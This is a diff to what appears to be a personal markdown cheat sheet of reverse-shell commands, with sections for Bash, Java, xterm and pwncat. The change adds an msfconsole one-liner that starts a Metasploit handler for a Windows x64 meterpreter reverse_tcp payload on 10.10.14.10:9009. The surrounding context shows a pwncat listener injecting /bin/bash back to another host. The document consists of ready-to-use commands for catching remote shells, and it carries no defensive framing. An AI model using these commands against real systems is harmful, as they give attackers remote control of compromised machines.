@@ -10,6 +10,7 @@
 - [[#Java]]
 - [[#xterm]]
 - [[#pwncat]]
+- [[#msfconsole]]
 
 
 ### Bash
@@ -82,6 +83,11 @@ p.waitFor()
 pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445+3
 ```
 
+### msfconsole
+```bash
+msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.10; set lport 9009; exploit"
+
+```
 
 ### xterm
 
